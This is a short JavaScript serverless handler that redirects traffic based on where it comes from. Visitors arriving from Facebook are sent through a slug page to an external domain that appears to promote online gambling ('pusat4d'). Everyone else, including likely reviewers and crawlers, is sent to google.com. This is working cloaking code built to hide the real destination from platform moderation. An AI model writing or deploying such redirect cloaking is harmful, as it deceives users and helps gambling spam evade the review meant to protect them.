export default function handler(req, res) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const referer = (req.headers["referer"] || "").toLowerCase();
  const url = new URL(req.url, `https://${req.headers.host}`);
  const path = url.pathname;
  const query = url.search;

  const isFB =
    referer.includes("facebook") ||
    url.searchParams.has("fbclid");

  // ===== ROOT =====
  if (path === "/") {
    if (!isFB) {
      return res.writeHead(301, {
        Location: "https://www.google.com/" + query
      }).end();
    }

    return res.writeHead(302, {
      Location: "/pusat4d-telah-melakukan-wd-1112" + query
    }).end();
  }

  // ===== SLUG =====
  if (path === "/pusat4d-telah-melakukan-wd-1112") {
    return res.writeHead(302, {
      Location: "https://kocak12.pusat4daksi.org/" + query
    }).end();
  }

  // ===== DEFAULT =====
  return res.writeHead(301, {
    Location: "https://www.google.com/"
  }).end();
}
